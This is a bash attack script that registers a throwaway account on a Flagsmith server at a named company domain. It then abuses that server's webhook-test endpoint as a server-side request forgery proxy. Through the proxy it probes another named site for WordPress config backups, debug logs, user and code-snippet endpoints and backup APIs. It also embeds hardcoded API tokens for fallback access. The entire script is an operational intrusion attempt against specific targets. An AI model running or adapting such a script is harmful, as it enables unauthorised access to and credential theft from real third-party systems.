#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Register FRESH Flagsmith account (v4 account may be rate limited)
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" -H "Accept: application/json" \
  -d '{"email":"kw-v7-test@proton.me","password":"Xk9mPw3nRt7v!","first_name":"V","last_name":"7"}' --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"

if [ -z "$KEY" ]; then
  KEY="5c835df901f2674a0788e25484a73eb42be31713"
  EKEY="8uLGCkxcX7sfS5GDFvy3Ah"
  echo "Using existing account"
else
  # Setup org/project/env
  OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d '{"name":"v7"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"v\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"v\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
  echo "Env: $EKEY"
fi

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
    -H "User-Agent: $UA" -H "Accept: application/json" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TIMEOUT"
}

# Test 1: WP REST API with Basic Auth (common password patterns)
echo "=== WP REST AUTH TEST ==="
# Test if WP application passwords are enabled
SSRF "https://koinp2p.com/wp-json/wp/v2/users/me"
echo ""

# Test 2: WP debug.log (might contain credentials)
echo "=== WP DEBUG LOG ==="
SSRF "https://koinp2p.com/wp-content/debug.log"
echo ""

# Test 3: WP backup files
echo "=== WP-CONFIG BACKUP ==="
SSRF "https://koinp2p.com/wp-config.php.bak"
echo ""
SSRF "https://koinp2p.com/wp-config.php~"
echo ""
SSRF "https://koinp2p.com/wp-config.php.old"
echo ""

# Test 4: WP Code Snippets REST API (might be accessible)
echo "=== CODE SNIPPETS ==="
SSRF "https://koinp2p.com/wp-json/code-snippets/v1/snippets"
echo ""

# Test 5: Really Simple SSL API
echo "=== RSSSL ==="
SSRF "https://koinp2p.com/wp-json/reallysimplessl/v1/tests"
echo ""

# Test 6: UpdraftPlus REST API  
echo "=== UPDRAFT REST ==="
SSRF "https://koinp2p.com/wp-json/updraftplus/v1/backup"
echo ""
